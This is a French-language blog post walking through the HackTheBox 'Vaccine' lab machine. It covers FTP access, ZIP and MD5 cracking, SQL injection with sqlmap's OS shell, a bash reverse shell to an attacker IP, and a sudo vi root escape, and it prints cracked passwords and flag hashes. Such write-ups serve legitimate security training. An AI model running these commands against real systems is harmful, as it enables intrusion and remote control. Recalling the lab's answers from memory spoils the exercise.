---
layout: post
title: "HackTheBox - Vaccine"
date: 2026-01-22 16:00:00 +0100
author: Howl
categories: [ctf]
tags: [linux, sqli, sqlmap, zip, md5, sudo, vi, medium]
platform: hackthebox
difficulty: medium
excerpt: "Machine Linux (Starting Point) avec extraction de credentials depuis un ZIP protégé, injection SQL avec sqlmap, crack de hash MD5 et exploitation de sudo vi."
---

## Informations

| Champ       | Valeur              |
|-------------|---------------------|
| Plateforme  | HackTheBox          |
| OS          | Linux               |
| Difficulté  | Medium              |
| Série       | Starting Point      |

---

## Reconnaissance

```bash
nmap -sC -sV 10.10.10.46
```

```
21/tcp open  ftp    vsftpd 3.0.3
22/tcp open  ssh    OpenSSH 8.0p1
80/tcp open  http   Apache 2.4.41
```

### FTP Anonyme

```bash
ftp 10.10.10.46
# anonymous / anonymous
get backup.zip
```

---

## Extraction du ZIP

Le fichier ZIP est protégé par mot de passe :

```bash
zip2john backup.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# 741852963
```

On extrait et on trouve `index.php` avec un hash MD5 :

```bash
unzip -P 741852963 backup.zip
grep -i password index.php
# $password = md5('qwerty789');
# Hash : 2cb42f8734ea607eefed3b70af13bde3
```

---

## Injection SQL

Sur la page web, on a un login. On utilise les credentials trouvés et on identifie une injection SQL sur le paramètre `order` :

```bash
sqlmap -u "http://10.10.10.46/dashboard.php?search=a" \
  --cookie="PHPSESSID=<SESSION>" \
  --os-shell
```

Sqlmap trouve une injection et nous offre un OS shell !

```bash
# Reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

---

## Élévation de privilèges

### Credentials dans la config PostgreSQL

```bash
cat /var/www/html/dashboard.php | grep -i password
# $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

On se connecte en SSH :

```bash
ssh postgres@10.10.10.46
# Password: P@s5w0rd!
```

### Sudo vi

```bash
sudo -l
# (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

GTFOBins nous donne la méthode :

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# Dans vi : :!/bin/bash
```

Root !

---

## Flags

```bash
cat /var/lib/postgresql/user.txt
# ec9b13ca4d6229cd5cc1e09980965bf7

cat /root/root.txt
# dd6e058e814260bc70e9bbdef2715849
```

---

## Conclusion

Vaccine est une excellente machine pour pratiquer sqlmap et la réutilisation de credentials. La chaîne FTP → ZIP → SQLi → sudo est très pédagogique.

**Outils :** `nmap`, `zip2john`, `john`, `sqlmap`, `GTFOBins`
